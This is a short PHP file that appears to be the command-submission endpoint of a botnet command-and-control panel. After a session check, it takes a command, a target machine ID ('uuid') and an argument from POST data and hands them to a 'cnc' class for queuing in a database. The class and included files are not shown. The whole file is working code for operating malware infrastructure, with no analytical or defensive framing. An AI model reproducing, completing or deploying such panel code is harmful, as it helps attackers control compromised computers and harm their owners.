<?php
session_start();
if(empty($_SESSION['auth']) || (!isset($_POST['cmd']) && key($_GET) != 'clear') || (empty($_POST['cmd']) && key($_GET) != 'clear')) {
	header('HTTP/1.0 403 Forbidden');
	die();
}
include '../sys/head.php';
$uuid = (!isset($_POST['uuid']))?'':$_POST['uuid'];
$arg = (!isset($_POST['arg']) || empty($_POST['arg']))?'N/A':$_POST['arg'];
$cmd  = strtolower($_POST['cmd']);

if(key($_GET) === 'clear') {
	header('location: ../index.php');
	$cmd = 'clear';
}

$cnc = new cnc();
echo $cnc->query($db, $cmd, $uuid, $arg);
?>
